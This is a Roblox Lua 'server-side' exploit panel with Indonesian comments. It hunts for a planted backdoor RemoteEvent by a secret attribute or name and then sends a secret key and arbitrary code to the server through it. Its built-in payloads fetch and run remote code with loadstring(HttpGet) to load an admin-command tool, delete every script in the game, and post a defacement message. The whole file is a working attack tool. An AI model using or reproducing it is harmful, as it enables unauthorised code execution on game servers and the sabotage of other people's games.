--[[ 
    PRABBBZ MASTER SS v3.0 - THE GHOST SCANNER
    Fitur: Auto-Detect Backdoor, Luxury UI, Smooth Navigation
]]

local SECRET_KEY = "PRABBBZ_SECRET_KEY_99"
local FoundRemote = nil

-- FUNGSI SCANNER (Mencari pintu masuk)
local function ScanForBackdoor()
    print("Scanning for PRABBBZ Backdoor...")
    for _, v in pairs(game:GetDescendants()) do
        if v:IsA("RemoteEvent") then
            -- Cek apakah Remote ini punya tanda rahasia kita atau nama khas
            if v:GetAttribute("SystemKey") == "PRABBBZ_VERIFIED" or v.Name:find("Internal_Service") then
                FoundRemote = v
                return true
            end
        end
    end
    return false
end

-- UI DESIGN (MEWAH)
local UI = Instance.new("ScreenGui", game:GetService("CoreGui"))
local Main = Instance.new("Frame", UI)
Main.Size = UDim2.new(0, 650, 0, 400)
Main.Position = UDim2.new(0.5, -325, 0.5, -200)
Main.BackgroundColor3 = Color3.fromRGB(12, 12, 15)
Main.BorderSizePixel = 0
Main.Active = true
Main.Draggable = true

local UICorner = Instance.new("UICorner", Main); UICorner.CornerRadius = UDim.new(0, 12)
local UIGradient = Instance.new("UIGradient", Main)
UIGradient.Color = ColorSequence.new(Color3.fromRGB(20, 20, 30), Color3.fromRGB(10, 10, 15))

-- STATUS BAR (Indikator Koneksi)
local StatBar = Instance.new("Frame", Main)
StatBar.Size = UDim2.new(1, 0, 0, 30)
StatBar.Position = UDim2.new(0, 0, 1, -30)
StatBar.BackgroundColor3 = Color3.fromRGB(20, 20, 25)

local StatText = Instance.new("TextLabel", StatBar)
StatText.Size = UDim2.new(1, -20, 1, 0)
StatText.Position = UDim2.new(0, 10, 0, 0)
StatText.BackgroundTransparency = 1
StatText.Text = "STATUS: SCANNING..."
StatText.TextColor3 = Color3.fromRGB(255, 255, 0)
StatText.TextXAlignment = Enum.TextXAlignment.Left
StatText.Font = Enum.Font.Code

-- HEADER & NAVIGATION
local Nav = Instance.new("Frame", Main)
Nav.Size = UDim2.new(0, 150, 1, -30)
Nav.BackgroundColor3 = Color3.fromRGB(18, 18, 22)

local Container = Instance.new("ScrollingFrame", Main)
Container.Position = UDim2.new(0, 160, 0, 50)
Container.Size = UDim2.new(1, -170, 1, -90)
Container.BackgroundTransparency = 1
Container.ScrollBarThickness = 3
local UIList = Instance.new("UIListLayout", Container); UIList.Padding = UDim.new(0, 10)

-- FUNGSI RUN
local function Execute(code)
    if FoundRemote then
        FoundRemote:FireServer(SECRET_KEY, code)
        StatText.Text = "STATUS: EXECUTED SUCCESSFULLY"
        StatText.TextColor3 = Color3.fromRGB(0, 255, 150)
    else
        StatText.Text = "STATUS: NO BACKDOOR DETECTED!"
        StatText.TextColor3 = Color3.fromRGB(255, 50, 50)
    end
end

-- TAMBAH SCRIPT KE LIBRARY
local function AddScript(name, desc, code)
    local btn = Instance.new("TextButton", Container)
    btn.Size = UDim2.new(0.95, 0, 0, 50)
    btn.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
    btn.Text = "  " .. name .. "\n  " .. desc
    btn.TextColor3 = Color3.new(1,1,1)
    btn.TextXAlignment = 0
    btn.Font = Enum.Font.Gotham
    btn.TextSize = 12
    Instance.new("UICorner", btn)
    
    btn.MouseButton1Click:Connect(function() Execute(code) end)
end

-- LIBRARY SCRIPTS (Contoh ratusan script bisa diinput di sini)
AddScript("Server Announce", "Kirim pesan ke semua orang", "local m = Instance.new('Hint', workspace); m.Text = 'PRABBBZ WAS HERE'; wait(5); m:Destroy()")
AddScript("Infinite Yield SS", "Jalankan Admin Command di Server", "loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()")
AddScript("Destroy All Scripts", "Matikan semua sistem game", "for _, v in pairs(game:GetDescendants()) do if v:IsA('Script') or v:IsA('LocalScript') then v:Destroy() end end")

-- JALANKAN SCANNER SAAT MULAI
task.spawn(function()
    if ScanForBackdoor() then
        StatText.Text = "STATUS: CONNECTED TO " .. FoundRemote.Name
        StatText.TextColor3 = Color3.fromRGB(0, 255, 150)
    else
        StatText.Text = "STATUS: BACKDOOR NOT FOUND"
        StatText.TextColor3 = Color3.fromRGB(255, 80, 80)
    end
end)

print("PRABBBZ SS PANEL v3.0 LOADED")
